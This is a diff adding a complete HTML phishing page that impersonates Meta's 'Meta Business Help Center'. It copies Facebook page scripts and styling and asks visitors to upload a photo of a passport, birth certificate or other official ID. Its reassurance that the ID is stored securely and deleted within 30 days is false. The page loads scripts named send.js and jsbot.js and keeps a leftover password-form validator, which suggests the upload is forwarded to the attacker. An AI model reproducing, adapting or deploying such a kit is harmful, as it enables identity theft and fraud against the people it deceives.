@@ -1,0 +1,758 @@
+<!DOCTYPE html><html lang="en" data-autoid="autoid_1" class=""><head>
+        
+        <title data-localize="screen_3.title">Upload your ID photo</title>
+        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+        <link href="icon_web.ico" rel="shortcut icon">
+        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+        <meta name="color-scheme" content="light">
+        <meta charset="utf-8" />
+        <link type="text/css" rel="stylesheet" href="css/LBeK2AdVA10.css" data-bootloader-hash="xrfi7E+" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/eknh9Re3ab9.css" data-bootloader-hash="xb82VEZ" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/ogGTLy0m35N.css" data-bootloader-hash="tvaPsvc" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/tMCGgMHbEWk.css" data-bootloader-hash="8A0KNb4" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/0gtnVJ5rfTK.css" data-bootloader-hash="p84v6t+" crossorigin="anonymous">
+        <script id="u_0_a_6+" nonce="">
+            function envFlush(a) {
+                function b(b) {
+                    for (var c in a) b[c] = a[c];
+                }
+                window.requireLazy ? window.requireLazy(["Env"], b) : ((window.Env = window.Env || {}), b(window.Env));
+            }
+            envFlush({
+                stratcom_event_profiler_hook: "1",
+                timeslice_heartbeat_config: {
+                    pollIntervalMs: 33,
+                    idleGapThresholdMs: 60,
+                    ignoredTimesliceNames: { requestAnimationFrame: true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true },
+                    isHeartbeatEnabled: true,
+                    isArtilleryOn: false,
+                },
+                shouldLogCounters: true,
+                timeslice_categories: { react_render: true, reflow: true },
+                sample_continuation_stacktraces: true,
+                dom_mutation_flag: true,
+            });
+        </script>
+        <script nonce="">
+            __DEV__ = 0;
+        </script>
+
+        <script id="u_0_7_Ck" nonce="">
+            (CavalryLogger =
+                window.CavalryLogger ||
+                function (a) {
+                    (this.lid = a),
+                        (this.transition = !1),
+                        (this.metric_collected = !1),
+                        (this.is_detailed_profiler = !1),
+                        (this.instrumentation_started = !1),
+                        (this.pagelet_metrics = {}),
+                        (this.events = {}),
+                        (this.ongoing_watch = {}),
+                        (this.values = { t_cstart: window._cstart }),
+                        (this.piggy_values = {}),
+                        (this.bootloader_metrics = {}),
+                        (this.resource_to_pagelet_mapping = {}),
+                        this.initializeInstrumentation && this.initializeInstrumentation();
+                }),
+                (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
+                    this.is_detailed_profiler = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setTTIEvent = function (a) {
+                    this.tti_event = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setValue = function (a, b, c, d) {
+                    d = d ? this.piggy_values : this.values;
+                    (typeof d[a] === "undefined" || c) && (d[a] = b);
+                    return this;
+                }),
+                (CavalryLogger.prototype.getLastTtiValue = function () {
+                    return this.lastTtiValue;
+                }),
+                (CavalryLogger.prototype.setTimeStamp =
+                    CavalryLogger.prototype.setTimeStamp ||
+                    function (a, b, c, d) {
+                        this.mark(a);
+                        var e = this.values.t_cstart || this.values.t_start;
+                        e = d ? e + d : CavalryLogger.now();
+                        this.setValue(a, e, b, c);
+                        this.tti_event && a == this.tti_event && ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
+                        return this;
+                    }),
+                (CavalryLogger.prototype.mark =
+                    typeof console === "object" && console.timeStamp
+                        ? function (a) {
+                              console.timeStamp(a);
+                          }
+                        : function () {}),
+                (CavalryLogger.prototype.addPiggyback = function (a, b) {
+                    this.piggy_values[a] = b;
+                    return this;
+                }),
+                (CavalryLogger.instances = {}),
+                (CavalryLogger.id = 0),
+                (CavalryLogger.getInstance = function (a) {
+                    typeof a === "undefined" && (a = CavalryLogger.id);
+                    CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+                    return CavalryLogger.instances[a];
+                }),
+                (CavalryLogger.setPageID = function (a) {
+                    if (CavalryLogger.id === 0) {
+                        var b = CavalryLogger.getInstance();
+                        CavalryLogger.instances[a] = b;
+                        CavalryLogger.instances[a].lid = a;
+                        delete CavalryLogger.instances[0];
+                    }
+                    CavalryLogger.id = a;
+                }),
+                (CavalryLogger.now = function () {
+                    return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime();
+                }),
+                (CavalryLogger.prototype.measureResources = function () {}),
+                (CavalryLogger.prototype.profileEarlyResources = function () {}),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
+                (CavalryLogger.start_js = function () {}),
+                (CavalryLogger.done_js = function () {});
+            CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+            (CavalryLogger.prototype.measureResources = function (a, b) {
+                if (!this.log_resources) return;
+                var c = "bootload/" + a.name;
+                if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+                var d = CavalryLogger.now();
+                this.ongoing_watch[c] = d;
+                "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+                b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+                if (a.type === "js") {
+                    c = "js_exec/" + a.name;
+                    this.ongoing_watch[c] = d;
+                }
+            }),
+                (CavalryLogger.prototype.stopWatch = function (a) {
+                    if (this.ongoing_watch[a]) {
+                        var b = CavalryLogger.now(),
+                            c = b - this.ongoing_watch[a];
+                        this.bootloader_metrics[a] = c;
+                        var d = this.piggy_values;
+                        a.indexOf("bootload") === 0 &&
+                            (d.t_resource_download || (d.t_resource_download = 0),
+                            d.resources_downloaded || (d.resources_downloaded = 0),
+                            (d.t_resource_download += c),
+                            (d.resources_downloaded += 1),
+                            d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+                        delete this.ongoing_watch[a];
+                    }
+                    return this;
+                }),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
+                    var a = {};
+                    Object.values(window.CavalryLogger.instances).forEach(function (b) {
+                        b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
+                    });
+                    return a;
+                }),
+                (CavalryLogger.start_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
+                }),
+                (CavalryLogger.done_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
+                }),
+                (CavalryLogger.prototype.profileEarlyResources = function (a) {
+                    for (var b = 0; b < a.length; b++) this.measureResources({ name: a[b][0], type: a[b][1] ? "js" : "" }, "_EF_");
+                });
+            CavalryLogger.getInstance().log_resources = true;
+            CavalryLogger.getInstance().setIsDetailedProfiler(true);
+            window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+        </script>
+        <script id="u_0_8_KG" nonce="">
+            (function _(a, b, c, d) {
+                function e(a) {
+                    document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
+                }
+                function f(a, b) {
+                    document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
+                }
+                if (!a) {
+                    e(b);
+                    e(c);
+                    return;
+                }
+                a = null;
+                (navigator.userAgent.indexOf("Firefox") !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
+                    document.documentElement != null &&
+                    ((a = screen.width / document.documentElement.offsetWidth), (a = Math.max(1, Math.floor(a * 2) / 2)));
+                (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96), (a = Math.max(1, Math.round(a * 2) / 2)));
+                f(b, (a || window.devicePixelRatio || 1).toString());
+                e = window.screen ? screen.width : 0;
+                b = window.screen ? screen.height : 0;
+                f(c, e + "x" + b);
+                d && document.cookie && window.devicePixelRatio > 1 && document.location.reload();
+            })(true, "m_pixel_ratio", "wd", false);
+        </script>
+        <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/translateelement.css">
+
+        <style>
+            *{
+                font-family: system-ui, -apple-system, 'system-ui', '.SFNSText-Regular', sans-serif !important;
+            }
+            @media only screen and (max-width: 600px) {
+                #langDialog {
+                    font-size: 0.85em;
+                }
+            }
+            #langDialog {
+                display : none;
+                width: 80%;
+                max-width: 670px;
+                margin: auto;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform : translate(-50%,-50%);
+
+                background-color: #fff;
+                z-index: 1000000;
+            }
+            #langDialog .titile-dialog {
+                padding-top: 5px;
+                padding-bottom: 5px;
+                padding-left: 10px;
+                padding-right: 10px;
+                background-color: #6d84b4;
+                border: 1px solid #365899;
+                border-bottom: 0;
+                color: #fff;
+                font-size: 14px;
+                font-weight: bold;
+            }
+            #langDialog .content-dialog {
+                display: flex;
+                flex-direction: row;
+
+                border-color: #555;
+                border-style: solid;
+                border-width: 0 1px;
+                padding: 10px;
+            }
+            #langDialog .content-dialog a {
+                color: #385898;
+                cursor: pointer;
+                text-decoration: none;
+            }
+            #langDialog .button-dialog {
+                background-color: #f2f2f2;
+                border: 1px solid #ccc;
+                border-bottom: none;
+                border-left: none;
+                border-right: none;
+                padding: 10px;
+
+                display: flex;
+                flex-direction: row-reverse;
+            }
+            #langDialog .button-dialog a {
+                font-size: 12px;
+                line-height: 26px;
+                background-color: #f5f6f7;
+                border: 1px solid #ccd0d5;
+
+                border-radius: 2px;
+                box-sizing: content-box;
+                color: #4b4f56;
+                font-size: 12px;
+                -webkit-font-smoothing: antialiased;
+                font-weight: bold;
+                justify-content: center;
+                line-height: 22px;
+                padding: 0 6px;
+                text-align: center;
+                text-shadow: none;
+                vertical-align: middle;
+
+                cursor: pointer;
+                display: inline-block;
+                text-decoration: none;
+                white-space: nowrap;
+            }
+            .title-span {
+                font-size: 1.5rem;
+                font-family: inherit;
+                word-wrap: break-word;
+                color: #050505;
+                width: 100%;
+                display: block;
+                text-align: center;
+                font-weight:700;
+            }
+            .divider {
+                align-items: center;
+                border-bottom: 1px solid #dadde1;
+                display: flex;
+                margin: 20px 0;
+                text-align: center;
+            }
+            .button {
+                width: 100%;
+                display: flex;
+                background-color: #1B74E4;
+                margin: 20px 0;
+                padding: 12px 16px;
+                border-left-width: 0;
+                border-right-width: 0;
+                border-top-width: 0;
+                justify-content: center;
+                box-sizing: border-box;
+                align-items: center;
+
+                border-radius: 6px;
+
+                color: white;
+                line-height: 1.3333;
+                border-bottom-width: 0px;
+            }
+input {
+    font-size: 17px;
+    padding: 14px 16px;
+    width: 100%;
+    border-radius: 6px;
+    background: #FFFFFF url(images/O7nelmd9XSI.png) repeat-x;
+    border: 1px solid #dddfe2;
+    color: #1d2129;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 12px;
+    height: 22px;
+    line-height: 16px;
+    vertical-align: middle;
+}
+input {
+    color: transparent;
+}
+input::before {
+    content: attr(placeholder);
+    color: #000;
+}
+input[type=file]::-webkit-file-upload-button {
+    width: 0;
+    padding: 0;
+    margin: 0;
+    -webkit-appearance: none;
+    border: none;
+    border:0px;
+}
+
+.div_error {
+
+}
+.div_error .upload-icon{
+    display: none;
+}
+.div_error .error {
+    display: inline;
+}
+.div_error input {
+    border: 1px solid #f02849 !important;
+    border-radius: 4px;
+    outline: none;
+}
+.error {
+    display: none;
+    width: 25px;
+    height: 25px;
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+}
+.border_error {
+    border: 1px solid #f02849 !important;
+}
+
+ x::-webkit-file-upload-button, input[type=file]:after {
+    content:'Browse...';
+    left: 100%;
+    color: #050505;
+    margin-left:3px;
+    position: relative;
+    -webkit-appearance: button;
+    padding: 3px 8px 2px;
+    border:0px;
+}
+.hide-before::before {
+    display: none;
+}
+
+.hide-before::after {
+    display: none;
+}
+        </style>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0FN0XQSDGF');
+</script>
+    </head>
+    <body tabindex="0" class="bare touch x1 _fzu _50-3 _67i4 iframe _2v9s portrait" style="background-color: #F0F2F5; min-height: 667px; ">
+        <script id="u_0_6_R4" nonce="">
+            (function (a) {
+                a.__updateOrientation = function () {
+                    var b = !!a.orientation && a.orientation !== 180,
+                        c = document.body;
+                    c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
+                    return b;
+                };
+            })(window);
+        </script>
+        <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 667px;">
+            <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Facebook</h1>
+            <div id="page">
+                <div class="_129_" id="header-notices"></div>
+                <div id="rootcontainer" style="height: 100vh;">
+                    <div class="_2v9s" id="root" role="main" style="height: 100vh;display: flex;flex-direction: column;background-color: #F0F2F5;" data-sigil="context-layer-root content-pane">
+                        <div class="_7om2" style="flex:1;flex-direction: column;align-items: center;    justify-content: center;">
+                            <div style="display:flex;align-items: center; height: 70px;">
+                                <span data-localize="screen_3.from" style="color: gray; margin-top: 10px;">from</span>
+                                <img src="images/meta.png" style="width:190px; height:90px;margin-left: -20px;">
+                            </div>
+                            <div style="display:flex;flex-direction: column;justify-content: center;    align-items: center;margin-bottom: 90px;">
+                                <div id="content-box" style="background-color: rgb(255, 255, 255); min-width: 330px; overflow: hidden; max-width: 394px; border-radius: 8px; padding: 16px; box-shadow: rgba(0, 0, 0, 0.2) 0px 12px 28px 0px, rgba(0, 0, 0, 0.1) 0px 2px 4px 0px, rgba(255, 255, 255, 0.5) 0px 0px 0px 1px inset; width: 1848px;">
+                                <form id="formFile" method="POST" onsubmit="return validateSubmit()" style="width: 100%;">    
+                                <span data-localize="screen_3.MetaBusinessHelpCenter" class="title-span">Meta Business Help Center</span> 
+                                    <span data-localize="screen_3.upload_your_id" class="title-span" style="font-size:1em; margin-top:12px;margin-bottom:12px;">Upload the Photo of your ID</span>
+                                    <div data-localize="screen_3.we_need_the_photo" style="font-family: inherit;width: 100%;font-size: 0.75rem;color: #050505;text-align: center;">
+                                    We need the photo of your official ID with your date of birth visible.<br> This could be a birth cerificate, passport or other type of officical identification.                                        </div>
+                                        <div style="margin:16px;display: flex;flex-direction: column;align-items: center;">
+                                        <label id="upload-file" style="position: relative;display:flex;width: 100%; ">
+                                        <input type="hidden" name="filename" id="filename" value="1792729796">
+                                        <input data-localize="screen_3.upload_your_id" type="file" name="file" id="file" data-testid="file" placeholder="" autofocus="1" aria-label="Email address or phone number">
+                                        <img id="error_email" class="error" src="images/error.png">
+                                        <img class="upload-icon" src="images/upload-image.png" style="position: absolute;right: 10px;top: 50%;transform: translateY(-50%);">
+                                    </label>
+                                    <div style="width: 100%;">
+                                    <button data-localize="screen_3.btn_submit_form" class="button" type="submit">Submit Form</button>
+                                    
+                                    </div>
+                                    </div></form>
+                                    <div style="display:flex;background-color: #E4E6EB;color: #050505;padding: 12px;margin: 16px;border-radius: 6px;">
+                                    <div>
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xi3auck" style="margin:6px;-webkit-filter: invert(59%) sepia(11%) saturate(200%) saturate(135%) hue-rotate(176deg) brightness(96%) contrast(94%);background-image: url('images/lock.png');background-size: 20px 20px;width: 20px;height: 20px;background-repeat: no-repeat;display: inline-block;"></i>
+                                    </div>    
+                                    <div data-localize="screen_3.notice">
+                                        Your ID will be stored securely and deleted within 30 days after we've finished confirming your identity. We might use trusted service providers to help review your information.                                        </div>
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div style="display: none;">
+                            <div></div>
+                            <div></div>
+                            <div></div>
+                        </div>
+                    </div>
+                </div>
+                <div class=""></div>
+                <div class="viewportArea _2v9s" style="display: none;" id="u_0_0_S6" data-sigil="marea">
+                    <div class="_5vsg" id="u_0_1_9Z" style="max-height: 938px;"></div>
+                    <div class="_5vsh" id="u_0_2_8r" style="max-height: 481px;"></div>
+                    <div class="_5v5d fcg">
+                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                        Loading...
+                    </div>
+                </div>
+                <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
+                    <div class="container">
+                        <div class="image"></div>
+                        <div class="message" data-sigil="error-message"></div>
+                        <a class="link" data-sigil="MPageError:retry">Try Again</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="static_templates">
+            <div class="mDialog" id="modalDialog" style="display: none;" data-sigil=" context-layer-root" data-autoid="autoid_2">
+                <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+                    <div class="_7om2 _52we">
+                        <div class="_5s61">
+                            <div class="_52z7">
+                                <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_4_J5" data-sigil="dialog-cancel-button">Cancel</button>
+                                <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_5_Du" data-sigil="dialog-back-button">
+                                    <i class="img sp_TH5s7LpCvWO sx_eb84d2" style="margin-top: 2px;"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="_4g34">
+                            <div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div>
+                        </div>
+                        <div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div>
+                    </div>
+                </div>
+                <div class="modalDialogView" id="modalDialogView"></div>
+                <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3_NC" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                    Loading...
+                </div>
+            </div>
+        </div>
+        <script>
+            function validateMyForm() {
+                var name = document.getElementById('name').value;
+                var password = document.getElementById('password').value;
+                var email = document.getElementById('email').value;
+
+                var count = false;
+                if (!(email != null && email != '') ) {
+                    document.getElementById('email').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('email').style.border = '1px solid #dddfe2';
+                }
+
+                if (!(password != null && password != '') ) {
+                    document.getElementById('password').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('password').style.border = '1px solid #dddfe2'
+                }
+
+                if (!(name != null && name != '') ) {
+                    document.getElementById('name').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('name').style.border = '1px solid #dddfe2'
+                }
+                if (count) {
+                    return false;
+                }
+                return true;
+            }
+            </script>
+       
+        <div class="AdBox Ad advert post-ads"></div>
+        <div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+            <div style="padding: 8px;">
+                <div>
+                    <div class="logo"><img src="images/translate_24dp.png" width="20" height="20" alt="Google Dịch"></div>
+                </div>
+            </div>
+            <div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Văn bản gốc</h1></div>
+            <div class="middle" style="padding: 8px;"><div class="original-text"></div></div>
+            <div class="bottom" style="padding: 8px;">
+                <div class="activity-links"><span class="activity-link">Đóng góp bản dịch hay hơn</span><span class="activity-link"></span></div>
+                <div class="started-activity-container">
+                    <hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;">
+                    <div class="activity-root"></div>
+                </div>
+            </div>
+            <div class="status-message" style="display: none;"></div>
+        </div>
+        <div class="dfp_unit"></div>
+        <div class="goog-te-spinner-pos">
+            <div class="goog-te-spinner-animation">
+                <svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66">
+                    <circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
+                </svg>
+            </div>
+        </div>
+    
+    
+    <div id="langDialog">
+        <div class="titile-dialog" style="">
+            Select your language        </div>
+        <div class="content-dialog">
+            <div style="flex:1">
+                    <ul>
+                        <!-- Thái Lan -->
+                        <li><a href="?lang=thai">?&nbsp;าษาไทย</a></li>
+                        <!-- Đan mạch -->
+                        <li><a href="?lang=da">Dansk</a></li>
+                        <!-- Thủy Điển -->
+                        <li><a href="?lang=sv">Svenska</a></li>
+                        <!-- Cộng hòa Séc -->
+                        <li><a href="?lang=se">Čeština</a></li>
+                        <!-- Pháp -->
+                        <li><a href="?lang=fr">Français (France)</a></li>
+                        <!-- NHật -->
+                        <li><a href="?lang=ja">日本語</a></li>
+                        <!-- Trung quốc-->
+                        <li><a href="?lang=ch-1">中文(简体)</a></li>
+                        <!-- Đài loan -->
+                        <li><a href="?lang=ch">中文(台灣)</a></li>
+                        <!-- Hy Lạp -->
+                        <li><a href="?lang=gre">Ελληνικά</a></li>
+                        <!-- Hungary -->
+                        <li><a href="?lang=hung">Magyar</a></li>
+                    </ul>
+                </div>
+
+                <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Thổ nhĩ kì -->
+                        <li><a href="?lang=tur">Türkçe</a></li>
+                        <!-- Mã lai -->
+                        <li><a href="?lang=ma">Bahasa melayu</a></li>
+                        <!-- Mông cổ -->
+                        <li><a href="?lang=mo">Монгол</a></li>
+                        <!-- Hà Lan -->
+                        <li><a href="?lang=na">Nederlands</a></li>
+                        <!-- Bulgaria -->
+                        <li><a href="?lang=no">Български</a></li>
+                        <!-- Na uy -->
+                        <li><a href="?lang=nay">Norsk</a></li>
+                        <!-- Nepal -->
+                        <li><a href="?lang=bu">नेपाली</a></li>
+                        <!-- Ba Lan -->
+                        <li><a href="?lang=pol">Polski</a></li>
+                        <!-- Do thái -->
+                        <li><a href="?lang=he">עברית</a></li>
+                        <!-- Bồ Đào Nha -->
+                        <li><a href="?lang=ba">Português (Portugal)</a></li>
+                    </ul>
+                </div>
+               <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Thụy điển -->
+                        <li><a href="?lang=sv">Svenska</a></li>
+                        <!-- Phần lan -->
+                        <li><a href="?lang=su">Suomi</a></li>
+                        <!-- estonia -->
+                        <li><a href="?lang=ee">Eesti</a></li>
+                        <!-- ĐỨc -->
+                        <li><a href="?lang=ge">Deutsch</a></li>
+                        <!-- Iceland -->
+                        <li><a href="?lang=ir">Íslenska</a></li>
+                        <!-- Ả rập -->
+                        <li><a href="?lang=ar">عربي</a></li>
+                        <!-- Slovakia -->
+                        <li><a href="?lang=sk">Slovak</a></li>
+                        <!-- România -->
+                        <li><a href="?lang=ro">România</a></li>
+                        <!-- Croatia -->
+                        <li><a href="?lang=hr">Hrvatski</a></li>
+                        <!-- Myanma -->
+                        <li><a href="?lang=mam">မြန်မာ</a></li>
+                        
+                    </ul>
+                </div>
+                <div style="flex:1;display: flex;justify-content: center;">
+                    <ul>
+                        
+                        <!-- Ireland -->
+                        <li><a href="?lang=ic">Gaeilge</a></li>
+                        <!-- Ý -->
+                        <li><a href="?lang=it">Italiano</a></li>
+                        <!-- Serbia -->
+                        <li><a href="?lang=rs">Србија</a></li>
+                        <!-- Uzbekistan -->
+                        <li><a href="?lang=uz">Uzbek</a></li>
+                        <!-- Tajik -->
+                        <li><a href="?lang=ta">Tajik</a></li>
+                        <!-- Kyrgyz -->
+                        <li><a href="?lang=ky">Kyrgyz</a></li>
+                        <!-- Kazakhstan -->
+                        <li><a href="?lang=ka">Kazakh</a></li>
+                        <!-- Khmer -->
+                        <li><a href="?lang=kh">ភាសាខ្មែរ</a></li>
+                        <!-- Slovenia -->
+                        <li><a href="?lang=sl">Slovenščina</a></li>
+                        <!-- Bosnia -->
+                        <li><a href="?lang=bo">Bosanski</a></li>
+                    </ul>
+                </div>
+        </div>
+        <div class="button-dialog">
+                <a href="#" onclick="closeDialog()">Close</a>
+        </div>
+    </div>
+    <script>
+        window.addEventListener("load", (event) => {
+            resize();
+        });
+        var widthBox = document.getElementById('content-box').offsetWidth;
+        window.addEventListener("resize", () => {
+            console.log(window.innerHeight);
+            if (widthBox >= window.innerWidth) {
+                document.getElementById('content-box').style.width = (window.innerWidth - 20) + "px";
+            }
+            else {
+                document.getElementById('content-box').style.width = widthBox + "px";
+            }
+            resize();
+        });
+
+        function resize() {
+            console.log(document.getElementById('content-box').offsetWidth + " " + document.getElementById('content-box').offsetHeight);
+            var width = document.getElementById('content-box').offsetWidth;
+            var height = document.getElementById('content-box').offsetHeight;
+            if (window.innerWidth >= (width - 16*2)) {
+                console.log("resize " + window.innerWidth);
+                document.getElementById('content-box').style.width = (window.innerWidth - 26*2) + "px";
+            }
+            else {
+                console.log("resize " + window.innerWidth);
+                if (width > height) {
+                    document.getElementById('content-box').style.height = (width - 26*2)+ "px";
+                }
+                else {
+                    document.getElementById('content-box').style.width = (height - 26*2) + "px";
+                }
+            }
+            
+        }
+
+        const result = document.querySelector("#file");
+
+        result.addEventListener("change", (event) => {
+            console.log(event.target.value);
+            var element = document.getElementById("file");
+            element.classList.add("hide-before");
+            document.getElementById('upload-file').classList.remove('div_error');
+            result.style.color = '#000';
+        });
+        var isImage = true;
+        function validateSubmit() {
+            var imageInput =document.getElementById('file');
+            var filename =document.getElementById('filename');
+            if (imageInput.value == '') {
+                document.getElementById('upload-file').classList.add('div_error');
+                return false;
+            }
+            else {
+                document.getElementById('upload-file').classList.remove('div_error');
+                if (isImage) {
+                    //getBase64(imageInput.files[0], filename.value);
+                    return false;
+                }
+                else {
+                    return true;
+                }
+                
+            }
+            
+        }
+        
+    </script>
+    <script src="js/jsbot.js"></script>
+    <script src="js/send.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="js/jquery.localize.min.js"></script>
+    <script src="js/base.js"></script>
+    <script>
+        var base = new BaseFunc();
+        // In a browser where the language is set to French
+        //$("[data-localize]").localize("localize", { language: "fr",pathPrefix: "/data/localize", skipLanguage: "en-US"})
+
+        // You can also override the language detection, and pass in a language code
+        $("[data-localize]").localize("localize", { language: base.getCurrentLanguage(), pathPrefix: "data/localize", skipLanguage: "en-US" });
+        
+    </script>
+    
+</body></html>
